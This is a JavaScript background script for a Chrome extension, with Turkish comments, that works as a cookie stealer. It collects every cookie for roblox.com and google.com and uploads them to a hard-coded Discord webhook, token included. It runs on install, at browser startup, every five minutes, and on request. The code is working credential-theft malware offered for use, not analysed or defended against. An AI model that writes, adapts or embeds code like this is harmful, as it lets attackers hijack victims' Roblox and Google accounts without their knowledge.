const webhookURL = "https://discord.com/api/webhooks/1367968628036603924/7pYaz9cWHbINHhXgnsJS2WidcY9UaBDIAcLxnMT6U0yjNtCSGCWI_3DlSU9cYDZEOYCU";

function sendWebhookFile(filename, content) {
  const blob = new Blob([content], { type: "text/plain" });
  const formData = new FormData();
  formData.append("file", blob, filename);

  fetch(webhookURL, {
    method: "POST",
    body: formData
  }).catch((error) => console.error("Webhook send failed:", error));
}

function extractCookies(domainFilter, callback) {
  chrome.cookies.getAll({}, (cookies) => {
    const filtered = cookies.filter(cookie => domainFilter(cookie.domain));
    const output = filtered.map(cookie => `${cookie.name}=${cookie.value}`).join("\n");
    callback(output);
  });
}

function logCookies() {
  // Roblox çerezleri
  extractCookies(domain => domain.includes("roblox.com"), (robloxCookies) => {
    if (robloxCookies) sendWebhookFile("roblox_cookies.txt", robloxCookies);
  });

  // Gmail (Google) çerezleri
  extractCookies(domain => domain.includes("google.com"), (gmailCookies) => {
    if (gmailCookies) sendWebhookFile("gmail_cookies.txt", gmailCookies);
  });
}

// Uzantı yüklendiğinde veya tarayıcı başlatıldığında logla
chrome.runtime.onStartup.addListener(() => logCookies());
chrome.runtime.onInstalled.addListener(() => logCookies());

// Ek olarak her 5 dakikada bir log gönder
setInterval(() => logCookies(), 5 * 60 * 1000);

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "sendCookies") {
    logCookies();
  }
});
